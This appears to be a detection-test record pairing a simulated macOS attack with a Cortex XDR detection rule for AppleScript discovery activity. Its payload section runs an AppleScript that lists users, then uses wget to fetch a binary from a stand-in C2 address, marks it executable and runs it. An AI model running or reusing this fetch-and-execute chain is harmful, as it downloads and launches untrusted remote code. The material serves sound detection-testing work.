identity.name: Uncommon AppleScript with Discovery Command via Command Line
identity.summary: An attacker executes an AppleScript containing a discovery command through the command line, which triggers a Cortex alert for unusual script behavior. The attack involves crafting a script to gather
identity.description: An attacker executes an AppleScript containing a discovery command through the command line, which triggers a Cortex alert for unusual script behavior. The attack involves crafting a script to gather system information and exfiltrate it via a test-net C2 endpoint.

payload.code:
echo 'tell application "System Events"
    set userName to name of every user
    set computerName to name of every computer
end tell' > /tmp/script.scpt

osascript /tmp/script.scpt

wget -O /tmp/c2_payload http://192.0.2.10:8080/malware

chmod +x /tmp/c2_payload

/tmp/c2_payload

expected_artifacts.description: Execution of osascript with AppleScript file
Outbound connection to test-net C2 server

biocs.name: Uncommon AppleScript Discovery Execution
biocs.description: Detection of AppleScript execution with discovery-related commands
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'osascript'
| filter action_file_path contains 'script.scpt'
| filter causality_actor_process_image_name = 'bash' or causality_actor_process_image_name = 'sh'
